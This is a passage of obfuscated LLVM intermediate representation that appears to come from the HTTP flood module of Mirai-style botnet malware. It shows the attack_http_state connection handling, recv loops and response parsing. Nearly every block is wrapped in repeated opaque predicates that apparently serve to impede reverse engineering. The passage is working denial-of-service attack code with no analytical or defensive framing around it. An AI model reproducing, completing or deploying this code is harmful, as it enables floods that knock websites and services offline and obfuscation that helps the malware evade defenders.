  %3379 = load i32, i32* @x.19
  %3380 = load i32, i32* @y.20
  %3381 = sub i32 %3379, 1
  %3382 = mul i32 %3379, %3381
  %3383 = urem i32 %3382, 2
  %3384 = icmp eq i32 %3383, 0
  %3385 = icmp slt i32 %3380, 10
  %3386 = or i1 %3384, %3385
  br i1 %3386, label %originalBB624, label %originalBB624alteredBB

originalBB624:                                    ; preds = %originalBB624alteredBB, %3378
  %3387 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3387, i32 0, i32 6
  %3389 = getelementptr inbounds [257 x i8], [257 x i8]* %3388, i32 0, i32 0
  %3390 = getelementptr inbounds i8, i8* %3389, i64 1
  call void @util_zero(i8* %3390, i32 255)
  %3391 = load i8*, i8** %65, align 8
  %3392 = load i32, i32* %18, align 4
  %3393 = add nsw i32 %3392, 1
  %3394 = sext i32 %3393 to i64
  %3395 = getelementptr inbounds i8, i8* %3391, i64 %3394
  %3396 = call i32 @util_strlen(i8* %3395)
  %3397 = icmp sgt i32 %3396, 0
  %3398 = load i32, i32* @x.19
  %3399 = load i32, i32* @y.20
  %3400 = sub i32 %3398, 1
  %3401 = mul i32 %3398, %3400
  %3402 = urem i32 %3401, 2
  %3403 = icmp eq i32 %3402, 0
  %3404 = icmp slt i32 %3399, 10
  %3405 = or i1 %3403, %3404
  br i1 %3405, label %originalBBpart2634, label %originalBB624alteredBB

originalBBpart2634:                               ; preds = %originalBB624
  br i1 %3397, label %3406, label %3417

; <label>:3406:                                   ; preds = %originalBBpart2634
  %3407 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3407, i32 0, i32 6
  %3409 = getelementptr inbounds [257 x i8], [257 x i8]* %3408, i32 0, i32 0
  %3410 = getelementptr inbounds i8, i8* %3409, i64 1
  %3411 = load i8*, i8** %65, align 8
  %3412 = load i32, i32* %18, align 4
  %3413 = add nsw i32 %3412, 1
  %3414 = sext i32 %3413 to i64
  %3415 = getelementptr inbounds i8, i8* %3411, i64 %3414
  %3416 = call i32 @util_strcpy(i8* %3410, i8* %3415)
  br label %3417

; <label>:3417:                                   ; preds = %3406, %originalBBpart2634
  br label %3418

; <label>:3418:                                   ; preds = %3417, %originalBBpart2622
  %3419 = load i32, i32* @x.19
  %3420 = load i32, i32* @y.20
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB636, label %originalBB636alteredBB

originalBB636:                                    ; preds = %originalBB636alteredBB, %3418
  %3427 = load i32, i32* @x.19
  %3428 = load i32, i32* @y.20
  %3429 = sub i32 %3427, 1
  %3430 = mul i32 %3427, %3429
  %3431 = urem i32 %3430, 2
  %3432 = icmp eq i32 %3431, 0
  %3433 = icmp slt i32 %3428, 10
  %3434 = or i1 %3432, %3433
  br i1 %3434, label %originalBBpart2638, label %originalBB636alteredBB

originalBBpart2638:                               ; preds = %originalBB636
  br label %3435

; <label>:3435:                                   ; preds = %originalBBpart2638, %3348
  br label %3436

; <label>:3436:                                   ; preds = %3435, %originalBBpart2609
  %3437 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3437, i32 0, i32 9
  %3439 = getelementptr inbounds [9 x i8], [9 x i8]* %3438, i32 0, i32 0
  %3440 = call i8* @strcpy(i8* %3439, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3441 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3441, i32 0, i32 1
  store i8 10, i8* %3442, align 4
  br label %4291

; <label>:3443:                                   ; preds = %2994
  br label %3444

; <label>:3444:                                   ; preds = %3443, %2905
  br label %3445

; <label>:3445:                                   ; preds = %3444, %2869
  %3446 = load i32, i32* @x.19
  %3447 = load i32, i32* @y.20
  %3448 = sub i32 %3446, 1
  %3449 = mul i32 %3446, %3448
  %3450 = urem i32 %3449, 2
  %3451 = icmp eq i32 %3450, 0
  %3452 = icmp slt i32 %3447, 10
  %3453 = or i1 %3451, %3452
  br i1 %3453, label %originalBB640, label %originalBB640alteredBB

originalBB640:                                    ; preds = %originalBB640alteredBB, %3445
  %3454 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %3455 = load i32, i32* %20, align 4
  %3456 = call i32 @util_memsearch(i8* %3454, i32 %3455, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3456, i32* %45, align 4
  %3457 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3457, i32 0, i32 9
  %3459 = getelementptr inbounds [9 x i8], [9 x i8]* %3458, i32 0, i32 0
  %3460 = call signext i8 @util_strcmp(i8* %3459, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3461 = sext i8 %3460 to i32
  %3462 = icmp ne i32 %3461, 0
  %3463 = load i32, i32* @x.19
  %3464 = load i32, i32* @y.20
  %3465 = sub i32 %3463, 1
  %3466 = mul i32 %3463, %3465
  %3467 = urem i32 %3466, 2
  %3468 = icmp eq i32 %3467, 0
  %3469 = icmp slt i32 %3464, 10
  %3470 = or i1 %3468, %3469
  br i1 %3470, label %originalBBpart2642, label %originalBB640alteredBB

originalBBpart2642:                               ; preds = %originalBB640
  br i1 %3462, label %3478, label %3471

; <label>:3471:                                   ; preds = %originalBBpart2642
  %3472 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3472, i32 0, i32 9
  %3474 = getelementptr inbounds [9 x i8], [9 x i8]* %3473, i32 0, i32 0
  %3475 = call signext i8 @util_strcmp(i8* %3474, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3476 = sext i8 %3475 to i32
  %3477 = icmp ne i32 %3476, 0
  br i1 %3477, label %3478, label %3497

; <label>:3478:                                   ; preds = %3471, %originalBBpart2642
  %3479 = load i32, i32* @x.19
  %3480 = load i32, i32* @y.20
  %3481 = sub i32 %3479, 1
  %3482 = mul i32 %3479, %3481
  %3483 = urem i32 %3482, 2
  %3484 = icmp eq i32 %3483, 0
  %3485 = icmp slt i32 %3480, 10
  %3486 = or i1 %3484, %3485
  br i1 %3486, label %originalBB644, label %originalBB644alteredBB

originalBB644:                                    ; preds = %originalBB644alteredBB, %3478
  %3487 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3487, i32 0, i32 1
  store i8 7, i8* %3488, align 4
  %3489 = load i32, i32* @x.19
  %3490 = load i32, i32* @y.20
  %3491 = sub i32 %3489, 1
  %3492 = mul i32 %3489, %3491
  %3493 = urem i32 %3492, 2
  %3494 = icmp eq i32 %3493, 0
  %3495 = icmp slt i32 %3490, 10
  %3496 = or i1 %3494, %3495
  br i1 %3496, label %originalBBpart2646, label %originalBB644alteredBB

originalBBpart2646:                               ; preds = %originalBB644
  br label %3556

; <label>:3497:                                   ; preds = %3471
  %3498 = load i32, i32* @x.19
  %3499 = load i32, i32* @y.20
  %3500 = sub i32 %3498, 1
  %3501 = mul i32 %3498, %3500
  %3502 = urem i32 %3501, 2
  %3503 = icmp eq i32 %3502, 0
  %3504 = icmp slt i32 %3499, 10
  %3505 = or i1 %3503, %3504
  br i1 %3505, label %originalBB648, label %originalBB648alteredBB

originalBB648:                                    ; preds = %originalBB648alteredBB, %3497
  %3506 = load i32, i32* %20, align 4
  %3507 = load i32, i32* %45, align 4
  %3508 = icmp sgt i32 %3506, %3507
  %3509 = load i32, i32* @x.19
  %3510 = load i32, i32* @y.20
  %3511 = sub i32 %3509, 1
  %3512 = mul i32 %3509, %3511
  %3513 = urem i32 %3512, 2
  %3514 = icmp eq i32 %3513, 0
  %3515 = icmp slt i32 %3510, 10
  %3516 = or i1 %3514, %3515
  br i1 %3516, label %originalBBpart2650, label %originalBB648alteredBB

originalBBpart2650:                               ; preds = %originalBB648
  br i1 %3508, label %3517, label %3536

; <label>:3517:                                   ; preds = %originalBBpart2650
  %3518 = load i32, i32* @x.19
  %3519 = load i32, i32* @y.20
  %3520 = sub i32 %3518, 1
  %3521 = mul i32 %3518, %3520
  %3522 = urem i32 %3521, 2
  %3523 = icmp eq i32 %3522, 0
  %3524 = icmp slt i32 %3519, 10
  %3525 = or i1 %3523, %3524
  br i1 %3525, label %originalBB652, label %originalBB652alteredBB

originalBB652:                                    ; preds = %originalBB652alteredBB, %3517
  %3526 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3526, i32 0, i32 1
  store i8 10, i8* %3527, align 4
  %3528 = load i32, i32* @x.19
  %3529 = load i32, i32* @y.20
  %3530 = sub i32 %3528, 1
  %3531 = mul i32 %3528, %3530
  %3532 = urem i32 %3531, 2
  %3533 = icmp eq i32 %3532, 0
  %3534 = icmp slt i32 %3529, 10
  %3535 = or i1 %3533, %3534
  br i1 %3535, label %originalBBpart2654, label %originalBB652alteredBB

originalBBpart2654:                               ; preds = %originalBB652
  br label %3555

; <label>:3536:                                   ; preds = %originalBBpart2650
  %3537 = load i32, i32* @x.19
  %3538 = load i32, i32* @y.20
  %3539 = sub i32 %3537, 1
  %3540 = mul i32 %3537, %3539
  %3541 = urem i32 %3540, 2
  %3542 = icmp eq i32 %3541, 0
  %3543 = icmp slt i32 %3538, 10
  %3544 = or i1 %3542, %3543
  br i1 %3544, label %originalBB656, label %originalBB656alteredBB

originalBB656:                                    ; preds = %originalBB656alteredBB, %3536
  %3545 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3545, i32 0, i32 1
  store i8 1, i8* %3546, align 4
  %3547 = load i32, i32* @x.19
  %3548 = load i32, i32* @y.20
  %3549 = sub i32 %3547, 1
  %3550 = mul i32 %3547, %3549
  %3551 = urem i32 %3550, 2
  %3552 = icmp eq i32 %3551, 0
  %3553 = icmp slt i32 %3548, 10
  %3554 = or i1 %3552, %3553
  br i1 %3554, label %originalBBpart2658, label %originalBB656alteredBB

originalBBpart2658:                               ; preds = %originalBB656
  br label %3555

; <label>:3555:                                   ; preds = %originalBBpart2658, %originalBBpart2654
  br label %3556

; <label>:3556:                                   ; preds = %3555, %originalBBpart2646
  %3557 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3557, i32 0, i32 0
  %3559 = load i32, i32* %3558, align 4
  %3560 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %3561 = load i32, i32* %45, align 4
  %3562 = sext i32 %3561 to i64
  %3563 = call i64 @recv(i32 %3559, i8* %3560, i64 %3562, i32 16384)
  %3564 = trunc i64 %3563 to i32
  store i32 %3564, i32* %20, align 4
  br label %4273

; <label>:3565:                                   ; preds = %originalBBpart2259
  %3566 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3566, i32 0, i32 1
  %3568 = load i8, i8* %3567, align 4
  %3569 = zext i8 %3568 to i32
  %3570 = icmp eq i32 %3569, 7
  br i1 %3570, label %3571, label %4140

; <label>:3571:                                   ; preds = %3565
  %3572 = load i32, i32* @x.19
  %3573 = load i32, i32* @y.20
  %3574 = sub i32 %3572, 1
  %3575 = mul i32 %3572, %3574
  %3576 = urem i32 %3575, 2
  %3577 = icmp eq i32 %3576, 0
  %3578 = icmp slt i32 %3573, 10
  %3579 = or i1 %3577, %3578
  br i1 %3579, label %originalBB660, label %originalBB660alteredBB

originalBB660:                                    ; preds = %originalBB660alteredBB, %3571
  %3580 = load i32, i32* @x.19
  %3581 = load i32, i32* @y.20
  %3582 = sub i32 %3580, 1
  %3583 = mul i32 %3580, %3582
  %3584 = urem i32 %3583, 2
  %3585 = icmp eq i32 %3584, 0
  %3586 = icmp slt i32 %3581, 10
  %3587 = or i1 %3585, %3586
  br i1 %3587, label %originalBBpart2662, label %originalBB660alteredBB

originalBBpart2662:                               ; preds = %originalBB660
  br label %3588

; <label>:3588:                                   ; preds = %4138, %originalBBpart2662
  %3589 = load i32, i32* @x.19
  %3590 = load i32, i32* @y.20
  %3591 = sub i32 %3589, 1
  %3592 = mul i32 %3589, %3591
  %3593 = urem i32 %3592, 2
  %3594 = icmp eq i32 %3593, 0
  %3595 = icmp slt i32 %3590, 10
  %3596 = or i1 %3594, %3595
  br i1 %3596, label %originalBB664, label %originalBB664alteredBB

originalBB664:                                    ; preds = %originalBB664alteredBB, %3588
  %3597 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3598 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3597, i32 0, i32 1
  %3599 = load i8, i8* %3598, align 4
  %3600 = zext i8 %3599 to i32
  %3601 = icmp ne i32 %3600, 7
  %3602 = load i32, i32* @x.19
  %3603 = load i32, i32* @y.20
  %3604 = sub i32 %3602, 1
  %3605 = mul i32 %3602, %3604
  %3606 = urem i32 %3605, 2
  %3607 = icmp eq i32 %3606, 0
  %3608 = icmp slt i32 %3603, 10
  %3609 = or i1 %3607, %3608
  br i1 %3609, label %originalBBpart2666, label %originalBB664alteredBB

originalBBpart2666:                               ; preds = %originalBB664
  br i1 %3601, label %3610, label %3611

; <label>:3610:                                   ; preds = %originalBBpart2666
  br label %4139

; <label>:3611:                                   ; preds = %originalBBpart2666
  %3612 = load i32, i32* @x.19
  %3613 = load i32, i32* @y.20
  %3614 = sub i32 %3612, 1
  %3615 = mul i32 %3612, %3614
  %3616 = urem i32 %3615, 2
  %3617 = icmp eq i32 %3616, 0
  %3618 = icmp slt i32 %3613, 10
  %3619 = or i1 %3617, %3618
  br i1 %3619, label %originalBB668, label %originalBB668alteredBB

originalBB668:                                    ; preds = %originalBB668alteredBB, %3611
  %3620 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3620, i32 0, i32 17
  %3622 = load i32, i32* %3621, align 4
  %3623 = icmp eq i32 %3622, 1024
  %3624 = load i32, i32* @x.19
  %3625 = load i32, i32* @y.20
  %3626 = sub i32 %3624, 1
  %3627 = mul i32 %3624, %3626
  %3628 = urem i32 %3627, 2
  %3629 = icmp eq i32 %3628, 0
  %3630 = icmp slt i32 %3625, 10
  %3631 = or i1 %3629, %3630
  br i1 %3631, label %originalBBpart2670, label %originalBB668alteredBB

originalBBpart2670:                               ; preds = %originalBB668
  br i1 %3623, label %3632, label %3644

; <label>:3632:                                   ; preds = %originalBBpart2670
  %3633 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3634 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3633, i32 0, i32 18
  %3635 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3634, i32 0, i32 0
  %3636 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3636, i32 0, i32 18
  %3638 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3637, i32 0, i32 0
  %3639 = getelementptr inbounds i8, i8* %3638, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3635, i8* %3639, i64 960, i32 1, i1 false)
  %3640 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3640, i32 0, i32 17
  %3642 = load i32, i32* %3641, align 4
  %3643 = sub nsw i32 %3642, 64
  store i32 %3643, i32* %3641, align 4
  br label %3644

; <label>:3644:                                   ; preds = %3632, %originalBBpart2670
  %3645 = load i32, i32* @x.19
  %3646 = load i32, i32* @y.20
  %3647 = sub i32 %3645, 1
  %3648 = mul i32 %3645, %3647
  %3649 = urem i32 %3648, 2
  %3650 = icmp eq i32 %3649, 0
  %3651 = icmp slt i32 %3646, 10
  %3652 = or i1 %3650, %3651
  br i1 %3652, label %originalBB672, label %originalBB672alteredBB

originalBB672:                                    ; preds = %originalBB672alteredBB, %3644
  %3653 = call i32* @__errno_location() #7
  store i32 0, i32* %3653, align 4
  %3654 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3654, i32 0, i32 0
  %3656 = load i32, i32* %3655, align 4
  %3657 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3657, i32 0, i32 18
  %3659 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3658, i32 0, i32 0
  %3660 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3661 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3660, i32 0, i32 17
  %3662 = load i32, i32* %3661, align 4
  %3663 = sext i32 %3662 to i64
  %3664 = getelementptr inbounds i8, i8* %3659, i64 %3663
  %3665 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3665, i32 0, i32 17
  %3667 = load i32, i32* %3666, align 4
  %3668 = sub nsw i32 1024, %3667
  %3669 = sext i32 %3668 to i64
  %3670 = call i64 @recv(i32 %3656, i8* %3664, i64 %3669, i32 16384)
  %3671 = trunc i64 %3670 to i32
  store i32 %3671, i32* %20, align 4
  %3672 = load i32, i32* %20, align 4
  %3673 = icmp eq i32 %3672, 0
  %3674 = load i32, i32* @x.19
  %3675 = load i32, i32* @y.20
  %3676 = sub i32 %3674, 1
  %3677 = mul i32 %3674, %3676
  %3678 = urem i32 %3677, 2
  %3679 = icmp eq i32 %3678, 0
  %3680 = icmp slt i32 %3675, 10
  %3681 = or i1 %3679, %3680
  br i1 %3681, label %originalBBpart2680, label %originalBB672alteredBB

originalBBpart2680:                               ; preds = %originalBB672
  br i1 %3673, label %3682, label %3684

; <label>:3682:                                   ; preds = %originalBBpart2680
  %3683 = call i32* @__errno_location() #7
  store i32 104, i32* %3683, align 4
  store i32 -1, i32* %20, align 4
  br label %3684

; <label>:3684:                                   ; preds = %3682, %originalBBpart2680
  %3685 = load i32, i32* @x.19
  %3686 = load i32, i32* @y.20
  %3687 = sub i32 %3685, 1
  %3688 = mul i32 %3685, %3687
  %3689 = urem i32 %3688, 2
  %3690 = icmp eq i32 %3689, 0
  %3691 = icmp slt i32 %3686, 10
  %3692 = or i1 %3690, %3691
  br i1 %3692, label %originalBB682, label %originalBB682alteredBB

originalBB682:                                    ; preds = %originalBB682alteredBB, %3684
  %3693 = load i32, i32* %20, align 4
  %3694 = icmp eq i32 %3693, -1
  %3695 = load i32, i32* @x.19
  %3696 = load i32, i32* @y.20
  %3697 = sub i32 %3695, 1
  %3698 = mul i32 %3695, %3697
  %3699 = urem i32 %3698, 2
  %3700 = icmp eq i32 %3699, 0
  %3701 = icmp slt i32 %3696, 10
  %3702 = or i1 %3700, %3701
  br i1 %3702, label %originalBBpart2684, label %originalBB682alteredBB

originalBBpart2684:                               ; preds = %originalBB682
  br i1 %3694, label %3703, label %3753

; <label>:3703:                                   ; preds = %originalBBpart2684
  %3704 = call i32* @__errno_location() #7
  %3705 = load i32, i32* %3704, align 4
  %3706 = icmp ne i32 %3705, 11
  br i1 %3706, label %3707, label %3736

; <label>:3707:                                   ; preds = %3703
  %3708 = load i32, i32* @x.19
  %3709 = load i32, i32* @y.20
  %3710 = sub i32 %3708, 1
  %3711 = mul i32 %3708, %3710
  %3712 = urem i32 %3711, 2
  %3713 = icmp eq i32 %3712, 0
  %3714 = icmp slt i32 %3709, 10
  %3715 = or i1 %3713, %3714
  br i1 %3715, label %originalBB686, label %originalBB686alteredBB

originalBB686:                                    ; preds = %originalBB686alteredBB, %3707
  %3716 = call i32* @__errno_location() #7
  %3717 = load i32, i32* %3716, align 4
  %3718 = icmp ne i32 %3717, 11
  %3719 = load i32, i32* @x.19
  %3720 = load i32, i32* @y.20
  %3721 = sub i32 %3719, 1
  %3722 = mul i32 %3719, %3721
  %3723 = urem i32 %3722, 2
  %3724 = icmp eq i32 %3723, 0
  %3725 = icmp slt i32 %3720, 10
  %3726 = or i1 %3724, %3725
  br i1 %3726, label %originalBBpart2688, label %originalBB686alteredBB

originalBBpart2688:                               ; preds = %originalBB686
  br i1 %3718, label %3727, label %3736

; <label>:3727:                                   ; preds = %originalBBpart2688
  %3728 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3728, i32 0, i32 0
  %3730 = load i32, i32* %3729, align 4
  %3731 = call i32 @close(i32 %3730)
  %3732 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3733 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3732, i32 0, i32 0
  store i32 -1, i32* %3733, align 4
  %3734 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3735 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3734, i32 0, i32 1
  store i8 0, i8* %3735, align 4
  br label %3736

; <label>:3736:                                   ; preds = %3727, %originalBBpart2688, %3703
  %3737 = load i32, i32* @x.19
  %3738 = load i32, i32* @y.20
  %3739 = sub i32 %3737, 1
  %3740 = mul i32 %3737, %3739
  %3741 = urem i32 %3740, 2
  %3742 = icmp eq i32 %3741, 0
  %3743 = icmp slt i32 %3738, 10
  %3744 = or i1 %3742, %3743
  br i1 %3744, label %originalBB690, label %originalBB690alteredBB

originalBB690:                                    ; preds = %originalBB690alteredBB, %3736
  %3745 = load i32, i32* @x.19
  %3746 = load i32, i32* @y.20
  %3747 = sub i32 %3745, 1
  %3748 = mul i32 %3745, %3747
  %3749 = urem i32 %3748, 2
  %3750 = icmp eq i32 %3749, 0
  %3751 = icmp slt i32 %3746, 10
  %3752 = or i1 %3750, %3751
  br i1 %3752, label %originalBBpart2692, label %originalBB690alteredBB

originalBBpart2692:                               ; preds = %originalBB690
  br label %4139

; <label>:3753:                                   ; preds = %originalBBpart2684
  %3754 = load i32, i32* %20, align 4
  %3755 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3756 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3755, i32 0, i32 17
  %3757 = load i32, i32* %3756, align 4
  %3758 = add nsw i32 %3757, %3754
  store i32 %3758, i32* %3756, align 4
  %3759 = load i32, i32* %35, align 4
  %3760 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3761 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3760, i32 0, i32 2
  store i32 %3759, i32* %3761, align 4
  br label %3762

; <label>:3762:                                   ; preds = %4137, %3753
  store i32 0, i32* %67, align 4
  %3763 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3764 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3763, i32 0, i32 14
  %3765 = load i32, i32* %3764, align 4
  %3766 = icmp sgt i32 %3765, 0
  br i1 %3766, label %3767, label %3986

; <label>:3767:                                   ; preds = %3762
  %3768 = load i32, i32* @x.19
  %3769 = load i32, i32* @y.20
  %3770 = sub i32 %3768, 1
  %3771 = mul i32 %3768, %3770
  %3772 = urem i32 %3771, 2
  %3773 = icmp eq i32 %3772, 0
  %3774 = icmp slt i32 %3769, 10
  %3775 = or i1 %3773, %3774
  br i1 %3775, label %originalBB694, label %originalBB694alteredBB

originalBB694:                                    ; preds = %originalBB694alteredBB, %3767
  %3776 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3777 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3776, i32 0, i32 14
  %3778 = load i32, i32* %3777, align 4
  %3779 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3779, i32 0, i32 17
  %3781 = load i32, i32* %3780, align 4
  %3782 = icmp sgt i32 %3778, %3781
  %3783 = load i32, i32* @x.19
  %3784 = load i32, i32* @y.20
  %3785 = sub i32 %3783, 1
  %3786 = mul i32 %3783, %3785
  %3787 = urem i32 %3786, 2
  %3788 = icmp eq i32 %3787, 0
  %3789 = icmp slt i32 %3784, 10
  %3790 = or i1 %3788, %3789
  br i1 %3790, label %originalBBpart2696, label %originalBB694alteredBB

originalBBpart2696:                               ; preds = %originalBB694
  br i1 %3782, label %3791, label %3795

; <label>:3791:                                   ; preds = %originalBBpart2696
  %3792 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3793 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3792, i32 0, i32 17
  %3794 = load i32, i32* %3793, align 4
  br label %3799

; <label>:3795:                                   ; preds = %originalBBpart2696
  %3796 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3796, i32 0, i32 14
  %3798 = load i32, i32* %3797, align 4
  br label %3799

; <label>:3799:                                   ; preds = %3795, %3791
  %3800 = phi i32 [ %3794, %3791 ], [ %3798, %3795 ]
  %3801 = load i32, i32* @x.19
  %3802 = load i32, i32* @y.20
  %3803 = sub i32 %3801, 1
  %3804 = mul i32 %3801, %3803
  %3805 = urem i32 %3804, 2
  %3806 = icmp eq i32 %3805, 0
  %3807 = icmp slt i32 %3802, 10
  %3808 = or i1 %3806, %3807
  br i1 %3808, label %originalBB698, label %originalBB698alteredBB

originalBB698:                                    ; preds = %originalBB698alteredBB, %3799
  store i32 %3800, i32* %67, align 4
  %3809 = load i32, i32* %67, align 4
  %3810 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3810, i32 0, i32 14
  %3812 = load i32, i32* %3811, align 4
  %3813 = sub nsw i32 %3812, %3809
  store i32 %3813, i32* %3811, align 4
  %3814 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3815 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3814, i32 0, i32 11
  %3816 = load i32, i32* %3815, align 4
  %3817 = icmp eq i32 %3816, 1
  %3818 = load i32, i32* @x.19
  %3819 = load i32, i32* @y.20
  %3820 = sub i32 %3818, 1
  %3821 = mul i32 %3818, %3820
  %3822 = urem i32 %3821, 2
  %3823 = icmp eq i32 %3822, 0
  %3824 = icmp slt i32 %3819, 10
  %3825 = or i1 %3823, %3824
  br i1 %3825, label %originalBBpart2710, label %originalBB698alteredBB

originalBBpart2710:                               ; preds = %originalBB698
  br i1 %3817, label %3826, label %3985

; <label>:3826:                                   ; preds = %originalBBpart2710
  %3827 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3828 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3827, i32 0, i32 18
  %3829 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3828, i32 0, i32 0
  %3830 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3831 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3830, i32 0, i32 17
  %3832 = load i32, i32* %3831, align 4
  %3833 = call i8* @table_retrieve_val(i32 36, i32* null)
  %3834 = call i32 @util_memsearch(i8* %3829, i32 %3832, i8* %3833, i32 11)
  %3835 = icmp ne i32 %3834, -1
  br i1 %3835, label %3836, label %3984

; <label>:3836:                                   ; preds = %3826
  %3837 = load i32, i32* @x.19
  %3838 = load i32, i32* @y.20
  %3839 = sub i32 %3837, 1
  %3840 = mul i32 %3837, %3839
  %3841 = urem i32 %3840, 2
  %3842 = icmp eq i32 %3841, 0
  %3843 = icmp slt i32 %3838, 10
  %3844 = or i1 %3842, %3843
  br i1 %3844, label %originalBB712, label %originalBB712alteredBB

originalBB712:                                    ; preds = %originalBB712alteredBB, %3836
  %3845 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3846 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3845, i32 0, i32 18
  %3847 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3846, i32 0, i32 0
  %3848 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3848, i32 0, i32 17
  %3850 = load i32, i32* %3849, align 4
  %3851 = call i8* @table_retrieve_val(i32 36, i32* null)
  %3852 = call i32 @util_memsearch(i8* %3847, i32 %3850, i8* %3851, i32 11)
  store i32 %3852, i32* %68, align 4
  %3853 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3853, i32 0, i32 18
  %3855 = load i32, i32* %68, align 4
  %3856 = sext i32 %3855 to i64
  %3857 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3854, i64 0, i64 %3856
  %3858 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3859 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3858, i32 0, i32 17
  %3860 = load i32, i32* %3859, align 4
  %3861 = load i32, i32* %68, align 4
